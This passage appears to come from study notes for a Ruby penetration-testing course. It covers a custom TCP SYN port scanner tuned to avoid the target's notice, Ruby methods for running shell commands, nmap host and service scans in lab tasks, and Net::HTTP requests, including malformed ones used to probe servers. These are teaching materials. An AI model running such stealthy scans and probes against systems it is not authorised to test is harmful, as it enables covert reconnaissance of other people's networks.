      <span class="k">if</span> <span class="n">flags</span><span class="p">.</span><span class="nf">syn</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">flags</span><span class="p">.</span><span class="nf">ack</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">open_ports</span><span class="p">.</span><span class="nf">include?</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
        <span class="n">open_ports</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
      <span class="k">elsif</span> <span class="n">flags</span><span class="p">.</span><span class="nf">rst</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">flags</span><span class="p">.</span><span class="nf">ack</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">closed_ports</span><span class="p">.</span><span class="nf">include?</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
        <span class="n">closed_ports</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
      <span class="k">end</span>
    <span class="k">end</span>
  <span class="k">end</span>
<span class="k">end</span>

</code></pre></div></div>

<ul>
  <li>The method <strong>send_tcp_syn</strong> first creates a TCPPacket and sets the correct mac address (default gateway if the host is outside the network – host mac address coming from ARP request if the host belongs to our network)</li>
</ul>

<p>Then For each port, it sends a TCP SYN packet (two times to avoid packets loss):</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">send_tcp_syn</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">start_port</span><span class="p">,</span><span class="n">end_port</span><span class="p">)</span>
  <span class="n">t</span> <span class="o">=</span> <span class="no">TCPPacket</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="ss">:config</span> <span class="o">=&gt;</span> <span class="no">Utils</span><span class="p">.</span><span class="nf">whoami?</span><span class="p">)</span>
  <span class="n">t</span><span class="p">.</span><span class="nf">eth_daddr</span> <span class="o">=</span> <span class="no">Utils</span><span class="p">.</span><span class="nf">arp</span><span class="p">(</span><span class="n">host</span><span class="p">)</span> <span class="k">if</span> <span class="no">Utils</span><span class="p">.</span><span class="nf">arp</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
  <span class="n">t</span><span class="p">.</span><span class="nf">ip_daddr</span> <span class="o">=</span> <span class="n">host</span>
  <span class="n">t</span><span class="p">.</span><span class="nf">tcp_flags</span><span class="p">.</span><span class="nf">syn</span> <span class="o">=</span> <span class="mi">1</span>
  <span class="n">start_port</span><span class="p">.</span><span class="nf">upto</span><span class="p">(</span><span class="n">end_port</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">port</span><span class="o">|</span>
	<span class="n">t</span><span class="p">.</span><span class="nf">tcp_dport</span> <span class="o">=</span> <span class="n">port</span>
	<span class="n">t</span><span class="p">.</span><span class="nf">recalc</span>
	<span class="mi">2</span><span class="p">.</span><span class="nf">times</span><span class="p">.</span><span class="nf">each</span> <span class="p">{</span> <span class="n">t</span><span class="p">.</span><span class="nf">to_w</span><span class="p">;</span><span class="nb">sleep</span><span class="p">(</span><span class="mf">0.02</span><span class="p">)}</span>
  <span class="k">end</span>
  <span class="nb">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="k">end</span>
</code></pre></div></div>

<p>The sleep methods in the previous implementation are used to avoid creating a flood of SYN packets against the target host.</p>

<ul>
  <li>with too many TCP requests For connection, the target host may become suspicious</li>
  <li>the greater the time between each TPC SYN is, the more silent the scanning is.</li>
</ul>

<p>Tcp_sps.rb (TCP SYN port scanner), first we start reading the parameters:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ruby</span> <span class="n">tcp_sps</span><span class="p">.</span><span class="nf">rb</span> <span class="n">host</span> <span class="n">start_port</span><span class="o">-</span><span class="n">end_port</span>
</code></pre></div></div>

<p>example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ruby</span> <span class="n">tcp_sps</span><span class="p">.</span><span class="nf">rb</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">3.14</span> <span class="mi">100</span><span class="o">-</span><span class="mi">200</span>
<span class="c1"># scan ports from 100 to 200 on the host 192.168.3.14</span>
</code></pre></div></div>

<h2 id="kernel-exec">Kernel Exec</h2>
<ul>
  <li>it replaces the current Ruby process with the command passed as argument</li>
  <li>this means that the original command is stopped. therefore there is no way to interact with the new command.</li>
  <li>The <strong>exec</strong> method is an abbreviation For kernel.exec method and it could be useful if u have a script that executes some logics and then it needs to call an external OS command without interacting with it.</li>
</ul>

<p>u will probably never have the need to use it but its an interesting method that we may want to know:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pry</span> <span class="o">--</span><span class="n">simple</span><span class="o">-</span><span class="n">prompt</span>
<span class="nb">exec</span> <span class="s1">'echo "Hello world"'</span>
<span class="c1"># Output: Hello World</span>
</code></pre></div></div>

<blockquote>
  <p>The echo command replaces the pry interpreter</p>
</blockquote>

<h3 id="kernel-system">Kernel System</h3>
<p>It differs from exec. it does not replace the current process; instead it creates a subshell and executes the command passed as argument inside it.</p>

<ul>
  <li>finally, it returns true if the command argument was found in the OS and it was executed correctly. otherwise it returns false.</li>
  <li>moreover, it prints the <strong>stdout</strong> and the <strong>stderror</strong> of the command as argument and it sets the global variable $? with the exit status information of the command execution.</li>
  <li>System is a Kernel method too. Therefore u can use the OO notation <strong>Kernel.system</strong> to call it.</li>
</ul>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">→</span> <span class="nb">system</span> <span class="s1">'echo "Hello"'</span>
<span class="vg">$?</span> 
<span class="c1"># now the global variable holds some status</span>
<span class="vg">$?</span><span class="p">.</span><span class="nf">pid</span> 
<span class="c1"># Output: 3458</span>
<span class="vg">$?</span><span class="p">.</span><span class="nf">exitstatus</span> 
<span class="c1"># Output: 0</span>
</code></pre></div></div>

<blockquote>
  <p>When the command is not found. False is returned and the stderror is printed.</p>
</blockquote>

<ul>
  <li>system method does not terminate the original process execution but it does not provide a way to interact with the command executed.</li>
  <li>therefore u cannot handle the sub-commands outputs (stdout and stderror) in any way.</li>
</ul>

<h3 id="kernel-backticks">Kernel Backticks</h3>

<p>Its another method to execute system commands in a sub-shell</p>

<ul>
  <li>it works as Kernel system method but the returned value is the standard output of the command executed in the sub-shell</li>
  <li>When using it, u can handle the output of any command sub-executed
Usage:
```ruby
output = ‘echo “hello”’
output</li>
</ul>

<p>//”hello”
// or u can use with the OO notation Kernel.’(command)            ‘</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
For example, how to extract the eth0 ip address

With regex:
```ruby
'ifconfig eth0' =~/inet addr:([0-9.]*)/
$1
# Output:  192.168.3.29
</code></pre></div></div>

<p>With kernel backsticks:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">puts</span> <span class="sx">%x{ifconfig eth0}</span>
<span class="c1"># Output: eth0 output</span>
</code></pre></div></div>

<h2 id="io-popen">IO popen</h2>
<p>Method provided by the IO class</p>

<p>The command stdin and stdout will be connected to the returned IO object (u cannot get the stderr)</p>

<p>Usage:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fd</span> <span class="o">=</span> <span class="no">IO</span><span class="p">.</span><span class="nf">popen</span><span class="p">(</span><span class="s1">'echo "hello"'</span><span class="p">)</span>
<span class="n">fd</span><span class="p">.</span><span class="nf">readline</span>
<span class="c1"># Output: "hello"</span>
</code></pre></div></div>

<table>
  <tbody>
    <tr>
      <td>IO.popen opens input and output streams with the sub-command (according to the opening mode r</td>
      <td>r+</td>
      <td>w</td>
      <td>w+…). Therefore, u can use all of the methods seen when we talked about streams.</td>
    </tr>
  </tbody>
</table>

<p>→ moreover: http://ruby-doc.org/core-1.9.3/IO.html</p>

<h3 id="open3-popen3">Open3 popen3</h3>
<p>Used if u want to interact with all of the three sub-command stream: stdin, stdout and stderr:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'open3'</span>
</code></pre></div></div>

<p>Example: execute nslookup command:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sin</span><span class="p">,</span><span class="n">sout</span><span class="p">,</span><span class="n">serr</span> <span class="o">=</span> <span class="no">Open3</span><span class="p">.</span><span class="nf">popen3</span><span class="p">(</span><span class="s1">'nslookup'</span><span class="p">)</span>
<span class="n">sin</span><span class="p">.</span><span class="nf">puts</span> <span class="s2">"www.google.com"</span>
<span class="n">sout</span><span class="p">.</span><span class="nf">gets</span>
<span class="c1"># Output: "Server:\t\t192.168.3.1\n"</span>

<span class="n">sout</span><span class="p">.</span><span class="nf">gets</span>
<span class="c1"># Output: "Address:\t\t192.168.3.1#53\n"</span>
</code></pre></div></div>

<h2 id="all-together-2">All together</h2>
<p>The most used are Kernel backticks and Open3 popen3</p>

<ul>
  <li>we want to create a script that takes as input a target network, performs a ping sweep and then shows a menu to select one port scanning technique (UDP, TCP Connection, TCP SYN)</li>
  <li>we need to interact with <strong>uphosts</strong> and <strong>pextr</strong> commands; we have to send the nmap output to the commands input stream.</li>
  <li>therefore we have to use a method that allows to send data to stdin; we will use Open3 popen3</li>
</ul>

<p>Usage command <strong>scan</strong>:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">scan</span> <span class="o">&lt;</span><span class="n">network</span><span class="o">&gt;</span>
<span class="sr">//</span> <span class="n">discover</span> <span class="n">targets</span> <span class="k">in</span> <span class="n">the</span> <span class="n">network</span> <span class="n">using</span> <span class="no">ICMP</span> <span class="n">ping</span> <span class="n">request</span> <span class="n">strategy</span>
</code></pre></div></div>

<blockquote>
  <p>As usual, the script can be improved. we can add other port scanning techniques, the possibility to choose a range of custom ports, and so on.</p>
</blockquote>

<h2 id="lab">Lab</h2>

<h3 id="task-1-discovery-alive-hosts">Task 1: Discovery alive hosts</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="no">PE</span> <span class="o">-</span><span class="n">sn</span> <span class="o">-</span><span class="n">n</span> <span class="mf">172.16</span><span class="o">.</span><span class="mf">10.0</span><span class="o">/</span><span class="mi">24</span> <span class="o">-</span><span class="n">oA</span><span class="o">=</span><span class="n">rede10</span>
</code></pre></div></div>

<ul>
  <li>Run a host discovery scan with Nmap and save the output in the three most used formats: XML, grepable and normal output. The remote networks are 172.16.10.0/24 and 172.16.11.0/24.</li>
</ul>

<h3 id="task-2---ip-extraction">Task 2 - ip extraction</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="no">PE</span> <span class="o">-</span><span class="n">sn</span> <span class="o">-</span><span class="n">n</span> <span class="mf">172.16</span><span class="o">.</span><span class="mf">10.0</span><span class="o">/</span><span class="mi">24</span> <span class="o">|</span> <span class="p">.</span><span class="nf">/</span><span class="n">ip_extraction_nmap</span><span class="o">-</span><span class="mi">2</span><span class="p">.</span><span class="nf">rb</span>
</code></pre></div></div>

<p>// the script</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1">#!/usr/bin/ruby</span>

<span class="k">begin</span>
  <span class="n">stream</span> <span class="o">=</span> <span class="vg">$stdin</span>
  <span class="n">stream</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">line</span><span class="o">|</span>
	<span class="sr">/^(?:Nmap scan report \for )((?:\d{1,3}\.){3}\d{1,3})/</span> <span class="o">=~</span> <span class="n">line</span>
	<span class="nb">puts</span> <span class="vg">$1</span> <span class="k">if</span> <span class="vg">$1</span>
<span class="k">end</span>
<span class="k">rescue</span> <span class="no">Exception</span> <span class="o">=&gt;</span> <span class="n">e</span>
  <span class="nb">puts</span>
<span class="k">end</span>

</code></pre></div></div>

<h3 id="task-3---open-ports">Task 3 - Open ports</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="no">T4</span> <span class="mf">172.16</span><span class="o">.</span><span class="mf">10.0</span><span class="o">/</span><span class="mi">24</span> <span class="o">-</span><span class="n">oA</span><span class="o">=</span><span class="n">rede10</span><span class="o">-</span><span class="n">ports</span>
</code></pre></div></div>

<h3 id="task-4---port-extraction">Task 4 - Port extraction</h3>

<h1 id="web">Web</h1>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Point

Request and Response

Data Extraction

Exercises
</code></pre></div></div>

<h2 id="http-protocol">HTTP Protocol</h2>
<ul>
  <li>we will focus no http</li>
  <li>Rubys alternatives to interact with a web server</li>
</ul>

<h3 id="using-simple-socket">Using simple socket</h3>

<ul>
  <li>it may happen that u have to test the behavior of a server when it receives incorrect packets.</li>
</ul>

<p>Our target is the simple index page of the apache web server:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">service</span> <span class="n">apache2</span> <span class="n">start</span>
</code></pre></div></div>

<ul>
  <li>we want to obtain the same page using Ruby and a TCP socket.</li>
</ul>

<p>The first thing to do is to open a TCP connection with our localhost on port 80:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"localhost"</span><span class="p">,</span><span class="mi">80</span><span class="p">)</span>
</code></pre></div></div>

<p>The correct verb to use is GET and the path is <strong>/</strong>:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">request</span> <span class="o">=</span> <span class="s2">"GET / HTTP/1.0</span><span class="se">\r\n\r\n</span><span class="s2">"</span>
<span class="n">s</span><span class="p">.</span><span class="nf">print</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">read</span>
<span class="c1"># Output: is the http response</span>
</code></pre></div></div>

<p>We can split headers and body to analyze them separately:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">headers</span><span class="p">,</span><span class="n">body</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="s2">"</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="p">)</span>
<span class="n">headers</span>
<span class="c1"># Output: of headers</span>

<span class="n">body</span>
<span class="c1"># Output:  of body</span>
</code></pre></div></div>

<ul>
  <li>We can try to send a misconfigured request</li>
  <li>like <strong>GE</strong> instead of <strong>GET</strong></li>
  <li>// method not implemented</li>
  <li>this strategy may be useful to detect if the server is vulnerable to misconfigured packet attacks</li>
</ul>

<h3 id="nethttp-library">Net::HTTP library</h3>
<p>→ http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html</p>

<p>We can use Net::HTTP class in different ways. we can use its class methods or its instances to achieve the same result:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'net/http'</span>
<span class="n">response</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="s2">"localhost"</span><span class="p">,</span><span class="s2">"/"</span><span class="p">)</span>
<span class="nb">print</span> <span class="n">response</span>
<span class="sr">//</span> <span class="n">we</span> <span class="n">get</span> <span class="n">the</span> <span class="n">output</span> <span class="n">of</span> <span class="n">body</span>
</code></pre></div></div>

<h3 id="open-uri-library">Open-uri library</h3>
<p>→ http://ruby-doc.org/stdlib-1.9.3/libdoc/open-uri/rdoc/OpenURI.html</p>

<p>To get the same body output:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span><span class="p">(</span><span class="s1">'open-uri'</span><span class="p">)</span>
<span class="nb">open</span><span class="p">(</span><span class="s1">'http://localhost/'</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">http</span><span class="o">|</span>
  <span class="nb">puts</span> <span class="n">http</span><span class="p">.</span><span class="nf">read</span>
<span class="k">end</span>
</code></pre></div></div>

<p>Usually open-uri is used when u have to retrieve the body response from a webserver quickly.</p>

<h3 id="uri-object">URI object</h3>
<ul>
  <li>URI is a module providing classes to handle Uniform Resource Identifiers. its used to encapsulate an URL (URL are a subset of URI)</li>
</ul>

<p>→ http://www.ruby-doc.org/stdlib-1.9.3/libdoc/uri/rdoc/URI.html</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">lhost_url</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="s2">"http://localhost"</span><span class="p">)</span>
<span class="sr">//</span> <span class="n">now</span> <span class="n">we</span> <span class="n">can</span> <span class="n">use</span> <span class="s1">'lhost_url'</span> <span class="n">with</span> <span class="s1">'open-uri'</span>
<span class="nb">open</span><span class="p">(</span><span class="n">lhost_url</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">http</span><span class="o">|</span>
<span class="nb">puts</span> <span class="n">http</span><span class="p">.</span><span class="nf">read</span>
<span class="k">end</span>
</code></pre></div></div>

<p>We can also use lhost_url with <strong>Net::HTTP</strong>:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">puts</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">lhost_url</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="nethttp-class-and-instances">Net::HTTP class and instances</h2>

<p>→ http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html#method-c-get</p>

<h3 id="get">GET</h3>
<ul>
  <li>The first verb we want to analyze is ‘GET’</li>
  <li>we will take about handlers, parameters and so on.</li>
</ul>

<h4 id="nethttp-get">Net::HTTP get</h4>

<ul>
  <li>we have seen that the Net::HTTP get class method can be used to obtain the body portion of the HTTP response from a target as a string.</li>
</ul>

<p>It sends a GET request to the target which can be specified using:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">an</span> <span class="no">URI</span> <span class="n">object</span> <span class="n">parameter</span>
<span class="n">host</span><span class="p">,</span> <span class="n">path</span> <span class="ow">and</span> <span class="n">port</span> <span class="n">parameters</span>
</code></pre></div></div>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">resp</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="no">URI</span><span class="p">(</span><span class="s2">"http://www.elearnsecurity.com"</span><span class="p">))</span>
<span class="c1"># we obtain the GET response body in string format</span>
</code></pre></div></div>

<p>To print the response body directly to stdout we use get_print:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get_print</span><span class="p">(</span><span class="no">URI</span><span class="p">(</span><span class="s2">"http://www.elearnsecurity.com"</span><span class="p">))</span>
</code></pre></div></div>

<p>We can avoid using the URI object in favor of the host and the path parameters:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">resp</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="s2">"www.elearnsecurity.com"</span><span class="p">,</span><span class="s2">"/"</span><span class="p">)</span>
</code></pre></div></div>

<p>Example of get_print with host and path parameters:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get_print</span><span class="p">(</span><span class="s2">"www.example.com"</span><span class="p">,</span><span class="s2">"/index.html"</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>we can use <strong>::</strong> or <strong>.</strong> to call a class method</li>
</ul>

<p>Example:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">::</span><span class="n">get_print</span><span class="p">(</span><span class="no">URI</span><span class="p">(</span><span class="s2">"http://localhost/"</span><span class="p">))</span>
<span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get_print</span><span class="p">(</span><span class="no">URI</span><span class="p">(</span><span class="s2">"http://localhost/"</span><span class="p">))</span>
</code></pre></div></div>

<h4 id="nethttp-get_response">Net::HTTP get_response</h4>
<ul>
  <li>In this case, we do not have a string as a result.</li>
</ul>

<p>We have an HTTPResponse object that encapsulates the HTTP response (the entire response, not only the body):</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">res_obj</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get_response</span><span class="p">(</span><span class="no">URI</span><span class="p">(</span><span class="s2">"http://localhost/"</span><span class="p">))</span>
</code></pre></div></div>

<h4 id="httpresponse-object">HttpResponse object</h4>

<ul>
  <li>this class wraps the response header and the response body together.</li>
</ul>

<p>Its the superclass of the real response object returned by get_response:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">res_obj</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get_response</span><span class="p">(</span><span class="no">URI</span><span class="p">(</span><span class="s2">"http://localhost/"</span><span class="p">))</span>
</code></pre></div></div>

<p>→  http://www.ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html#class-Net::HTTP-label-HTTP+Response+Classes</p>

<p>Status:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">res_obj</span><span class="p">.</span><span class="nf">code</span>
<span class="c1"># Output: "200"</span>
<span class="n">res_obj</span><span class="p">.</span><span class="nf">message</span>
<span class="c1"># Output: "OK"</span>
<span class="n">res_obj</span><span class="p">.</span><span class="nf">class</span><span class="p">.</span><span class="nf">name</span>
<span class="c1"># Output: "Net::HTTPOK"</span>

</code></pre></div></div>

<p>Headers:
To get the hash of the headers:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">res_obj</span><span class="p">.</span><span class="nf">to_hash</span>
</code></pre></div></div>

<p>We can also use each and each_header:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">res_obj</span><span class="p">.</span><span class="nf">each</span> <span class="p">{</span> <span class="o">|</span><span class="n">key</span><span class="p">,</span><span class="n">value</span><span class="o">|</span> <span class="nb">print</span> <span class="n">key</span><span class="p">,</span><span class="s2">":  "</span><span class="p">,</span><span class="n">value</span><span class="p">,</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">}</span>
</code></pre></div></div>

<p>To obtain a particular header:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">res_obj</span><span class="p">[</span><span class="s2">"content-type"</span><span class="p">]</span>
<span class="c1"># Output: "text/html"</span>

<span class="n">res_obj</span><span class="p">[</span><span class="s2">"server"</span><span class="p">]</span>
<span class="c1"># Output: "Microsoft-IIS/7.5"</span>
</code></pre></div></div>

<ul>
  <li>with the headers we can get information about the server For example, but sometimes web security experts change this header value (with fake ones) in order to hide the real server software and version.</li>
</ul>

<p>Body:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">print</span> <span class="n">res_obj</span><span class="p">.</span><span class="nf">body</span>
</code></pre></div></div>

<h4 id="response-object-types">Response Object types</h4>
<p>If a resource does not exist, we have a <strong>404</strong> and an <strong>HTTPNotFound</strong> subclass object:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">res_obj</span><span class="p">.</span><span class="nf">class</span><span class="p">.</span><span class="nf">name</span>
<span class="c1"># Output: "Net::HTTPNotFound"</span>

<span class="n">res_obj</span><span class="p">.</span><span class="nf">code</span>
<span class="c1"># Output: "404"</span>
</code></pre></div></div>

<p>If the requested resource has been permanently moved then we have a <strong>301</strong> code and an <strong>HTTPMovedPermanently</strong> subclass object:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">res_obj</span><span class="p">.</span><span class="nf">class</span><span class="p">.</span><span class="nf">name</span>
<span class="c1"># Output: "Net::HTTPMovedPermanently"</span>

<span class="n">res_obj</span><span class="p">.</span><span class="nf">code</span>
<span class="c1"># Output: "301"</span>
</code></pre></div></div>

<p>In the moved permanently response, the location header specifies where to find the resource:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">res_obj</span><span class="p">[</span><span class="s1">'location'</span><span class="p">]</span>
</code></pre></div></div>

<h4 id="parameters">Parameters</h4>
<p><strong>GET</strong> requests can have parameters too. The portion of URL that contains data parameters is called query string.</p>

<p>→ https://hack.me/</p>

<ul>
  <li>this project allows u to start a vulnerable web app where u can test your script without violating any laws</li>
  <li>it looks like hack.me is offline, donc je suis perdu</li>
</ul>

<h4 id="url-encapsulation">URL encapsulation</h4>
<p>First perform a GET using the entire URL containing the query string:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">target</span> <span class="o">=</span> <span class="s1">'http://&lt;full url&gt;'</span>
<span class="n">res</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="no">URI</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
</code></pre></div></div>

<p>Check the <strong>res</strong> with the response we expect:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">res</span> <span class="o">=~</span><span class="sr">/You have searched For: hello/</span>
<span class="c1"># Output: 2057</span>
<span class="c1"># the string is at position 2057</span>
</code></pre></div></div>

<h4 id="dynamic-parameters">Dynamic parameters</h4>
<ul>
  <li>A URI instance can encapsulate an entire URL string. we can retrieve and set all of the URL fields by using the getter and setter provided by the URI class.</li>
</ul>

<p>→ moreover: http://www.ruby-doc.org/stdlib-2.1.0/libdoc/uri/rdoc/URI.html</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">url</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
<span class="n">url</span><span class="p">.</span><span class="nf">host</span> <span class="c1"># 's20570-101060-xjo.tarentum.hack.me'</span>
<span class="n">url</span><span class="p">.</span><span class="nf">path</span> <span class="c1"># '/search.php'</span>
</code></pre></div></div>

<p>Since the <strong>target</strong> URL does not contain a query string,  the URL object returns <strong>nil</strong> using the query getter:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">url</span><span class="p">.</span><span class="nf">query</span>
<span class="c1"># Output: nil</span>
</code></pre></div></div>

<ul>
  <li>Query method is a setter too.</li>
</ul>

<p>We can create them by using a simple hash (params) and then we can use the <strong>encode_www_form</strong> utility method to create the correct query string:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="ss">:find</span><span class="o">=&gt;</span><span class="s2">"hello"</span><span class="p">,</span><span class="ss">:searching</span><span class="o">=&gt;</span><span class="s2">"yes"</span><span class="p">}</span>
<span class="n">url</span><span class="p">.</span><span class="nf">query</span> <span class="o">=</span> <span class="no">URI</span><span class="p">.</span><span class="nf">encode_www_form</span><span class="p">(</span><span class="n">params</span><span class="p">)</span>
<span class="c1"># Output: "find=hello&amp;searching=yes"</span>
</code></pre></div></div>

<p>Now we can perform the <em>*GET</em> request using Net::HTTP get (open-uri can be used too):</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">res</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

<span class="n">res</span> <span class="o">=~</span><span class="sr">/You have searched For: hello/</span>
<span class="c1"># Output: '2057'</span>
</code></pre></div></div>

<h4 id="nethttp-instances">Net::HTTP instances</h4>
<p>→ http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html</p>

<p>First create a Net::HTTP instance and specify the target address:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">http</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"www.elearnsecurity.com"</span><span class="p">)</span>
</code></pre></div></div>

<h4 id="using-get-instance-method">Using GET instance method</h4>
<p>We have to call it by specifying the resource path we want to request as an argument:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">res</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="s2">"/"</span><span class="p">)</span>
